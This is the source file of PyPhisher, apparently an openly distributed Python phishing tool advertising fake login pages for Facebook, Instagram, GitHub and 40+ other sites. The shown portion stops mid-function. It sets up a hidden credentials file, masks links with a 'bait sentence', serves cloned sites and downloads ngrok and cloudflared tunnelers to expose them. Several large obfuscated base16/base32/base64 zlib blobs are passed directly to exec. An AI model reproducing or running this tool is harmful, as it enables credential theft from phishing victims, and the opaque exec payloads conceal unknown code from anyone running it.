# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 1.8
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish, AdvPhishing

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'F02BE058F1DFDF5FBFF5142B8EE95AE05AE9F4297F18087342946816349278C381543BC834DB05D25FB4441BE9EBF71937D5CEDD9B430265ABC8E0FC24E75E4C2F793F7A97739336D1FC4811BC3DC255B694AD145C8BBDF8E5534FF0F69171FCD168880827752672674E8A9FB444700C967800502DE64CEDD67620F2D0B7D8E993EF4DB8F9F5D9BE8317213EB9F542D734FA1B1F8762431EFCFA26E1CB9B6DC551F5775EB93F1486B6FE7A9A6FB5EC9BE9D7CBC0B130AEF9A256D66D266A2A586DB9BA550C6A703A5B44E676E50AB1E27CDB72BBABB11A9C94607F518AC98BD5EADC7746C27424A4B8FBC1A485EA01B48B26894D7D89BE94E82AD1D907D94062F8CC781A1FCF16145DAB1BF784666972912392594A2CC5146DA448AAD3C2727DC5EEBF24C6B0370E52C608D51599A428A91AE6D3D30F72879AF892D9A9E4DF406F4CCABB9DE3E234CAAD513A25B207DE05C95209B41FAA15C150A536AEAF980AACF090595E101A1D54EB112E3AED0F2A1BAE5C0883867C74FF7FF0D16AB2C90E2D5F464834946E12556777A451CF3F97CD4C4C7E8A6F4E68F5F97D7F7FBEBE7F3F7F9FEFBE6CCE78020D6C8FF5A0E0D6255534842E9048CD74EA1D3C44C013D1199B2951C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.8"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By KasRoudra]
'''

modules = [ "requests", "bs4" ]
processes = [ "php", "ngrok", "cloudflared" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        import_module(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            system(f"pip3 install {module}")
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        import_module(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, Session
from bs4 import BeautifulSoup

websites_url = "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" # "https://github.com/KasRoudra/files/raw/main/websites.zip"

templates_file = "files/templates.json"
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
email = ""
password = ""
receiver = ""
mask = ""

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux = True
    saved_file = "/sdcard/.creds.txt"
    try:
        if not isfile(saved_file):
            mknod(saved_file)
        with open(saved_file) as checkfile:
            data = checkfile.read()
    except:
        system("termux-setup-storage")
else:
    termux = False
    saved_file = f"{root}/.creds.txt"


# Check if sudo is allowed
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo = True
else:
    sudo = False

# Check if it is mac and if tunnelers are installed
if system("command -v brew > /dev/null 2>&1")==0:
    brew = True
    if system("command -v ngrok > /dev/null 2>&1")==0:
        ngrok = True
    else:
        ngrok = False
    if system("command -v cloudflared > /dev/null 2>&1")==0:
        cloudflared = True
    else:
        cloudflared = False
else:
    brew = False
    ngrok = False
    cloudflared = False
   

print(f"\n{info}Please wait!\n")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===6ESMYWKA67XP72777JSYQMYDPFFIRNJAXKADVCM4RFHDELJRSGUMS6N66ED7QN5MNHMUBGKAWA4NYV64FFXPN4EORPOAWPLP7773ZRXTZGG2EZTR7WKSMMOOH4NPZX5PDG36ZI3E6KKZHYGLNMG32YBBPEKJ5EEKYYE7VYLRKXEYGS3AYLNBEEC4I7KZQJDC6D52YZNWWQOTDWUQ23YJLLOEXFK5BQRJ7S7G4IUPQ7XDC5QE4SAB7N24AWR742S2DRBKMWPNM3AJBBI24SG7UFQXAXPN2PNISS3HZPFUTPZYBETUKRLLNRSZUFBNKDTGS4TBGQV6FF7VHI2ZZQZDYRYXVJXX4CN4KF55SCKQCVO7ANIACXC7XCDQ63QXUJ3ODZ2RYILE2JXZBTYHD245CPF3S2KFZSTJ554NT2I5P2AW7PPYMZZSB7IPJHBKY3C6BA2J7QCLTUBILNHKHZBS7TOFYVOHC6T7ZAAIQHYRPXQZJBRVN2TGXN3AJ2ZPPTVPCI7OGM77PJAZKCS47BMIGQHXHQHRDMFCZSDHXL3VOBHMAHJQXC2XBZHJ7T4N4W3EC4UOA5HAYCGTDS7CACLAUGJSYFXOAHDADDSOJWLHJPDA362JPHUJDZKN66ZMYUF643HJHWAPUQEZRAQ5LOELQYSZNZGIV3SKNS4JHMMGZQCB56JGBENNISN75JS2POAI7ODE3BIDGZAOGFJGNIPAOTAWRK7AF7DAUGIWHDMCRBY2B5JL6GFGCPYLC7SDSRRXCTDBYTK4PCWW6J3WMHYNA5K6CAZPAJS7I6E42CDMBNBBEPYJQHDHXACBPRABTPBNPOASUQ6HMBPJPKCV3F5K2J7LEW4VHY5VMAQYLPC3O3MU7GJG7EEIQKRUTEJ7FGGKPDR2VTA5VYM72ZEC6ENTKVJMAAV7XWYXDYQCYSZOV62KAPS3DNYJM37LO6TDTAHB2GSVPBRWCACGKYMHPYLBUKGW4H2W6NQS5PW267QADTYQPJIOWPM6SRPK7D7ZOSFTMXOON5RSCSJSAXMQE22E52XQW5XP6OTRXQHXEP3HG27YNU34PTEG5KFZDDAJ5ZFOINKXYP3SBY7MORLWBAWFYCAZGV3PK5TSQZU7ELH2RN2D7OERZBCTQM6GRANK2FSXJXYEBXEGQRDRDIOE5MBGNQPHRPDTXXXVVVJBPOUUZNMPRR7CSXLO7UTXKEFPTUNZAWIBPSI36NIAPMN53SMQAPTFYB5HGSDLROGABAKWITV7NC5DD32OAICHXDQXGQFKKXUCSDZYPIKBJ4F7QTRM36NMRCXPRHKP2HYHXQGCUFE4GARQQF4AWQBJZNYOBN727AUTOS4DQPZXTXYEECY4DM5EYNPRIGIW4W65MJMAGMVISQU2HDJX7IL5ZVQLVY4IUERTXJAX746QFGX36HTVEUIMOHATLMMBFPH7ZRW6KYHLHECRM4G4XGF4HIVV5XPV5AQLAAAG3X3FKLJOWDYV56WZIZJSANO7PJKJNFZ4NDSEO45TOP2JZ7MWAKK434EZCQT7YYQWKMZJ5QWIPFRGTCIJYGQ4L5MDRO2PVXLZZWSKETFFLAJKLWDWV576L3FD6Z3EFQFO66XDLAMVRHTQQVTZFVSZ3SV5XZBZYWMAG6CZAYEQE24XWVFSFDJOBUUL6CZBGZJNI76S3F4FM5MSRPALSBJ5VG2UMQCSKHP4NNPFIUFNOFDBA7YUAIPYBW6NOCW2IYOC4EIKCRYQP2HYLRDW37ZMQ442XJU5EXSVVQZDR2YI552ELADZYE6OJ5AARAX6SSBUGDRFINLARQF2BXKOTEOGXIL3QUBIBIPOBM6LKL7MOWUAUQXNVJGQACIYP72SNC4GXLL53QBWTBMUTWNUPPLLNEHLLMEVA6E4IB7TPRIXLDP2M53LERTXEIYRGKMCRKWX3Z7MPBHSV2BJXIMIGBPYH6N56G5NPCKQDYPZ2QMXNH6VRJ6GJUAYCB32KNIMCHG7HQPEZB3HJW25ANYBW7CHLLQP4GK6AMFIQLMEOYV7Y257BTKKBPNY5QAQAGGUOQBHIBU23R53EPVBOUJVFOUOOPRRUQTXRBYXNG7LGQ66PXD4LMH5Y4SMPAK526JON5R26FWU5DNMQMGSS3QBBJT6WXPM5LQMQMHX5QHKF542Z7GDSFOFPHNP5Z7Y7NV6VQN3LADI7NJQ4NPENCTXNPOG3ZUA6Z65B7WKFZDI2HJ3BB4NSQLGAAWKIF23LJHQYTZMPY4R7AZCFWLSTRPDEM664NE4MU27MTQME3AA4L5AVSLFSJFTGQPXZZMBM6WYIQ5KM6NULVGGGLBFHSWBS2DEFWLTVVNHNCU36ZAVPG57W2LIPFLDNDEVNWDSIXIWSZNXKPNL4C3QVORTU433L4W6COWACPD5XLWXNOQR4FRGVHJ4R4EP7OGCKFWGIAOITAJPL4BREY3MKLYEKZCGBJNT5NFB5FZCXPXRW33MUFR27RDC6SWRYG6DVSZLREBC63GQJEWWAQRNX6BW3RQFPNMX2O2YVYSXIC7NSECZBQYPQRPINBGAKPR5IQADLVEFM4LMCULVBUWORS75LZSGAEMKY37EBK74WLMIYNHKQH5GREJLPQSZ7Q3W3V2S233HCPJS2E7HWEEZBAG6BJAH3RZ755AODJLURY2J2UE3FZZPCV6BC3NJMGAZRYF53F6AEKQCJKF4R5CQAP7NGAMPQ4ELN2YFP2P5PCIFGUO43YHQ3MPFHRCNMENG4MJ6PIPN5NGMZD47OY3GTCYW4PQEPDTLHI5KBFR63ZAC7WHTSZZ4OAAEULWRVLLN6ND53W4UBTHRTG23W57XQ4QFANMVSADBJZ7663BAIGGSSCZWI5NMFWIQXW7V2H5RN3POXE6B4Q7LDTPD2NXP7Q7SBLLK2VZPSULU6FXYWWE6TXJF5RRKHRB7C3L2BNB6QQ752YL4IMMRMK7ROKLXTZXV5DJDF5UAEPE3PWFTCY3VGQKRRM4MS65XFPY4GMP2SPRPHIA2U56SHKDEUPOTOGYJJXLTPYXCV2PMO3IQMIXALMADG72CMRTZCBO4MLDWXPHYRKHG5DPQ3ZHPZJPSKHCOLEBLKEN5CGTGPWRN52G4NCRQDLZMLIGCTFTSCW3O7X4GMFTTEZTFN26OVKXJAX3SCWE6JYP3NGVXLYYL673GKLNL42Z7E5HIPQGWAHPJJWKRPT3WZEXEIAXYNHA6GBNNQSBYNTUK74QJDCNBWLRAQVXRV7SBG3P3DWEOKN4AVE5XCMT4JMK5DB56KA2H5HT7RZM6NVMKLBHPU3LNTWEBUBYMK3ZJ73SNUAP63GB6AVAJHSA6K3MXAK6C34ANAVBNZMSI4S7NGAIMEQZEXXYK6CALAR4JJJKP5CXUYV2U45PCEIWDOJDFXYQNFPDKMQUM67RPIHDEYV4MSG6QWABHKGAQLCRKTADRVFMP7M4JDVNWPR6JCB75CCQJGMODO25V3V4CWQHADH2WZVW6UPGAAWLWUVPZRWPIDU4L2DIVICTKD442IJLCL6ADUY5FRRLEKJ477WGODWKNXIC63YQ265JWDONQZMYCJU7QVJ3Q6MVAVQNBUA6KKB63JPYLYRYV25QMHHQPBSQO46DIKLXXBDXOACRFU3IYCNI424E7SY2HEGTVNDDBL5TOWL6IBUFGP3BGIXOK4MCCW3L2ATQ54WLJ3SCBDXLIQJ2YT74MXVQMX73UTYV5AAGTQD3LJRG2A74CM6EWLB5IWDLPW5OJ63RUA3IZMI6LWJKIBFMQG27YZTVUWGMPYRZL6OGBYHXM23ONP6SS4DOY74FMET5HKNMBPX27O3LFA6ZCFZY36V665ZSCGLA6QHGA23SMYUVQQGOTB7IIORNBGEGQAMJJODTKLQ4VRJHQNZAZZBZGKF6DJT2V2GB3EXFW2VFPK5WIA73ZIV2QARBJLW4D33S2E5QK5QOIO2DMG4W6BZ62UKKUOPSXOSCLG2M3OB44Q3IHGZEZO5R4FMMLXIYROF7Y7EZC7LEHXH3XLXYIJVP5O6Z375LQ2MUFVHJEFTEIPK25UKWT3TJ5675EIEAYHYRTKXIG4FQFXRHPHTURKG4LRPPXJ4QC33NJTFWQEL7QEMDMWLZYZVDOZUE2L7B6SWFGLCFHJ45TN65ERLW7STNBY7QSOWE65KBVOHJXNHC4FST6UH6DHHSHKRUIOXP7NOHWJ3W3BJOB7VQE7GCNOAPPLT6GT6PXIFXF6IAUIQTN4RFJ4WH42DTZFJIZPZ5UCRPB6GXGAISAOTI2GYBJ2TRK2FV56NS2NYS3NA7OAI7M64G2JYWXUZRFHSH7VY4VUBL6EY5GWI2CQ7OR6IFPCI4YTTJFKW7ZG33AFJCP2LYPYKHLRQKWCSAFJJRKZBK4372M6I6FRN2Y7LKNLFG64J5HPBEEHDFH2AT6BPUL56KHRGLDVEVWJS6747VXELM2N6YDIX6JGNRAD5COUM2FQIWFXRER3PMNJHES7UUEJG6J7UDPN2NDH4GAXBEEUHMPSHZ34RJ7F45MUPVTELPHS42EY3SJZLXQB6ATL3JJDJQOLQWYVCLOAR5BNQH7XSQVLB2EQPRBYLW3JVB7C2FJMP5MOB554JNVKLUXG6PZDC45KW3D723YYYBRZBWL6QJOYG5LFB6O6SG4NE2AYESMM4IBIBNYBZOIQOMG2IUYEXCROHADK2NHYGKWWMB6RNGNLLS6YLSD4OVD26X6LZU3VWEAKBMI3YP7STQYLBLJEQFO4RH5VKSGPFA7W5KVBZ3OBJ7PMVM6XIVSYQHJJKDJRWLESZ2S45G7AXZPL4VTVLQMJB622SWXRD4VXXPPUXQKXWKOQSHLQ2Z6PU5JTPPKVKQ3VKJC2MH5VSIUQAUQ5OT2FR5Y3WCOXXZUST25GZII5BPGVOZK24FYLYKXOSAEFBXZQZVVKHDNQZ4XYLF5V4VZHCXIS7KCAU6ZNBWXU5WLEFDGZXUYW53RL6DK5VXYTLWHNNLLP55GQIU5C4VWNW2DT4W7PEDTOWMIJF2P3Q5SYYCYUV642VGCMP3DZFAVT2FRU37TKBKZBBNMH7HFNOPVRUMSCQK5M4XWXJ5ZZY2EXYWYCXQG2WSEJXHQPSRCN5ALDPBWXSPRHC4W6YFSZU5V42BQT2EKHBUPO5S5ZY2EDT5YQPLXVF2655CEO7FMI5PTWKVPJD3FST322GBUCHO3VHFUJJ2WEROOIPP25MKFZCJJ5T2CZWZHGH4TDOZK2WOLZM7C6A4JXKHMZDHBLWC435WJKBRLUDWNN6J4WXHETPUL44WT2IBB4RQT3X5LMUZH3DPY7U4ONESCSYYBCXNTLOPTQB3ZY74CLK7KY3CKVTN7QY6MBEO6CLDRR7FB7DS5F25NXZ3FIIUSQNMWG5XFNNDHKZB3QFLHHW5TUN3ZM4YZC5JDWTMKOKKPXYZYS6ZIRDI2NLL2QRQCNZD7QPGGIWZ4PUY2JRL3Y2UGEWG6KZM4TSWDCROV7OO3KN3VXFE2VJ7FKNPGLU6NLYRAO52JXMW3CESKDXG4F5V4OGJXU575STE75JZAYAD3T7IWYSOWN524T442R3CJ2LHQA3V2KNXFLCH2KTOWXAFUZXIBIXWN65QLE4IMLBNO4UIRUCIHXPSI6PEJ776DX24I2H23FDYF27QEOF5HYNXRDDRDPJVMNYFZZFKPGVWTFWPWUKW5NEXNVMXAM3KRL6RFYJMNYEXG6BPIONUFBQJT66MHJXPZUGPJCIV77HGBZSMVH7QGB6BT7GL73J2SWI4MEEC5O53P4SPVZY3WFBQNW4WTNTTK7OTGV7FBQNAJLLBNG7ULIZ5ONRHFXMLYQK4RNHY2QHQHHXAZWSERYJX6CPRGRBXZRGPZOIFNZ7CK5KEYUPKXGGKYUZ7RSYB7W3Y6JZ34RCVKB5RBPV5SYDU2P7DPQNKKESXIBU6N6IYL6CP22N5KWDTL6O5VDDXROJ2SF7O76MPOWHHW3WE7TCGWUG4MEEMWFX5XUV5XIKRUAAUBVW2ICECBA7QOT7AK3KCE7UZDNRV3FF4O3B4KB5HHN2Z4JZKFPFAFSY6SMDPW4W4ZCIRHLQ57PQ5WZL3BDH2B2JWSUJKTP7RAKUBLCZWYVOXEWHUMWMRL5HEOLIWMUWVNP53CQYTBMFXM6K2CHC6XG26UARZSKE4O5C5B6F72DKTZP2POX6VKZOI67SQOPPNRC2KLBTA3QYNHDXXIYEXMGUWNVILC32TZVPITKOYY236MEFM3G73EW4LLBMRFZVTE3J5N4LEHNEDJ66JSLKP2GI4K72RO4SGBK7Z7KCB4EV5H4TZXWDX6MMQUGJXLF3N5YFGXG5NKLHP43XKMHASISG4HUINLOGB3I7Z6Q2OG3SPQOVPT5F66FVQ74T57FMQFLU4XJCRRQBDOXZ2Q3G3DDXL2P6MJ7SG3QR36OXH3TFKXNHWZDNY5KMZRWFOXPBDXRZXEXGMYFGEQUO23EVXJOFP4O75ZGT2JVRSTNZTXR7NJHS36W46UHMBJX7RKRNKXH4TESK7K5XQWX53T3V5LNW2L73544DFN2PPMPEWG5IZTLVK3JVVIBFL4HWHRWIT34UT3XLPWKX5IKECLF4F3ZGDCK3ERHQ2DNN2XPKA3N675WO5CVKU34M2VGWZ2YG3MO6CMEXN765LW767765LH74X77XHP7677QM7KE3QZJSKSMFIUASUZPYH6XDUD3MQ3SSZERHBFQY4YVZZ36XJ7REMFQL23RJCG3BOCP'))

# Write/Append errors to error file
def write_error(e):
    if isfile(error_file):
        with open(error_file, "a") as error_log:
            error_log.write(str(e)+"\n")
    else:
        with open(error_file, "w") as error_log:
            error_log.write(str(e)+"\n")

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages
def installer():
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman"]:
        # Check if package manager is present but php isn't present
        if system(f"command -v {pacman} > /dev/null 2>&1")==0:
            if system("command -v php > /dev/null 2>&1")!=0:
                sprint(f"\n{info}Installing PHP{nc}")
                if pacman=="pacman":
                    system(f"sudo {pacman} -S php")
                elif pacman=="apk":
                    system(f"sudo {pacman} add php")
                elif sudo:
                    system(f"sudo {pacman} install -y php")
                else:
                    system(f"{pacman} install -y php")
                break


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if system(f"pidof {process} > /dev/null 2>&1")==0:
            system(f"killall {process}")



# Set up ngrok authtoken to work with ngrok links
def ngrok_token():
    while not isfile(f"{root}/.ngrok2/ngrok.yml"):
        token = input(f"\n{ask}Enter your ngrok authtoken (write 'help' for instructions): {green}")
        if token!="":
            if token=="help":
                sprint(ngrok_help, 0.01)
                sleep(3)
            else:
                system(f"cd $HOME/.ngrokfolder && ./ngrok authtoken {token}")
                break
        else:
            print(f"\n{error}No authtoken!")
            sleep(1)
            break

def saved():
    system("clear")
    sprint(logo, 0.01)
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        main()

# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[PyPhisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[KasRoudra] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/KasRoudra] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/KasRoudra] ")
    print(f"{red}[Email]     {cyan} :[kasroudrakrd@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    global mask
    fol = input(f"\n{ask}Enter the directory > {green}")
    mask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    # Remove slash and spaces from mask
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html") :
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server()
        else:
            sprint(f"{error}index.php/index.html required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of PyPhisher
def updater():
    internet()
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        write_error(e)
        git_ver = version
    if (version != git_ver and git_ver != "404: Not Found"):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# First function main

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'6teFk9h///7z5rmXvhUlsjuzH/S6+Jcpk3LLLBoPherwYSiE/UumtpbwhHs/60dbIxvfT6joY0GhqtagaqkDvMQlKir01/5vEzsyuRipgvM2buijZWiaGNcJtuklDElp5x6QPJz2LbNV/MzLCmMUnNXVvm06bKGCjFPyULt+5rrZrDcFXK2TkiEo/iV9j4pDAPHM+J1dREwBGCSke7FfJlWL+nkPdGr+GHdReqQyGvzpDNye53vIBx/i12UVisCs7Xrh03RVXjJUkmJqfuPEyBPuB6Xrbj80HtMTqtrIZWrl7Sxrxc14M+os+q4PquTUmF4FicYTmoDuQfh2z17OYSueyHA2y+KIQmPgOKzRhuWKYRAQxtibBXkvzqqfbTXlZUTqD1bt3l/XqTGkK+FeiDiHKRohngpxuTIU5hJY7FOa4KL5DG71cIT6ZwOlBjiIUYOJ5pLFvVqGQCbqHci1+tOMSO+B3VFSZ8jIIP/iEX3vgz5QlbHPvVKQ9ms+LEI14K19+VHnGc4PYkjVc14Z3pD778th04YN3qGfXJeWu4obW7CwteZGp8eNDaq0Yp0NIzorJXEvkSSVEQMeXXhZo1dyaLSyVhu67/2UfE1QtwOnB1wBP/KO5++YSi/Wp+iqgcE45WOxAFzbVmY9/un5kN6gTn86z2usaD9QkXX6GV9u+7y+cnR0hJA5yf41yURxUVarUM49Jy5O7cpFqpp25t84+P9P8qd3SuAKduc534DoPO02UEaCBgmQMz7pTwYrV3aMa/2yaIGPnd8srUiooepcBrjaGI81fQ7/OiQK35FhV087edO5835u9k/i/9CcpVo0K4IxLa0YUjuAxJJETgzO3kZjvpcN+wFhq3IuDHphpuDQXk6/GXm9bOTgxaAVtqMdbLYee3gPEnvxBl/TPltCe7iSDRVyMDFPcfjrkccI4+Ko4MGUjLq5izx4PACBMNE2oHiU7tvUvDfCYrqT0d81JYzfQKsDHNC0mpUpqC1y2ap3ALLfLnKh1o0vqu0bK7bdJiug5CizFXyX3+0rtSwZ+lONZ/8FafApbJ29OtBtxvR5rC8pgUpPvWXGPpmRw0MhFt/J2haBmKAu0OVPmgUBur6ZX9zo+5HhfD6rlxaE11SZsDXLdV7oCaXjaQH9bVzKdNQBMPgTqHLJdMq3xpAxbK/dT2CDKubUXAZatkjXEA1TTfnkXXoLkwpTtFnvzIe0vHX1RKMF7dCoXVh+wEI1llr/iqhbN7lqJsowRXBGmV6aiXOutg4viN6o5MF8ebNMWbtuML2Wz9bVuwIMsfXJHofBY8mAYUnzEk8aLPaaGXQysvTFFyo7svqdlSKqOHJHzR0CH716q5SkaeKntkXux+0eLqTHJA/S/3Wq2rq6yfPe+yojgEh3YhIJ5fiUGfcx95YVMrLUhYE4Xt66TS4pz9kw/wOot4ZFeLGGhlD+NX/j77/fy/3vfnP/+zyuK3n865lf+yRLxBnFkdLcnCA6k0CALed6PHNQCgFrWUL1NwJe'))

# 2nd function installing packages and downloading tunnelers
def prerequiments():
    global is_mail_ok, email, password, receiver
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing proot{nc}")
            system("pkg install proot -y")
    installer()
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    osinfo = uname()
    # architecture = popen("uname -m").read().strip()
    # platform = popen("uname").read().strip()
    platform = osinfo.system
    architecture = osinfo.machine
    if not exists(f"{root}/.ngrokfolder"):
        mkdir(f"{root}/.ngrokfolder")
    if not exists(f"{root}/.cffolder"):
        mkdir(f"{root}/.cffolder")
    if not isfile(f"{root}/.ngrokfolder/ngrok") or (brew and not ngrok):
        sprint(f"\n{info}Downloading ngrok.....{nc}")
        internet()
        system("rm -rf ngrok.zip ngrok.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz", "ngrok.tgz")
                extract("ngrok.tgz", f"{root}/.ngrokfolder")
                remove("ngrok.tgz")
            elif architecture.find("arm")!=-1:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip", "ngrok.zip")
                extract("ngrok.zip", f"{root}/.ngrokfolder")
                remove("ngrok.zip")
            elif architecture.find("x86_64")!=-1:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{root}/.ngrokfolder")
                remove("ngrok.zip")
            else:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip", "ngrok.zip")
                extract("ngrok.zip", f"{root}/.ngrokfolder")
                remove("ngrok.zip")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{root}/.ngrokfolder")
                remove("ngrok.zip")
            elif architecture.find("arm64")!=-1:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{root}/.ngrokfolder")
                remove("ngrok.zip")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                system("brew install ngrok/ngrok/ngrok")
                sleep(3)
        else:
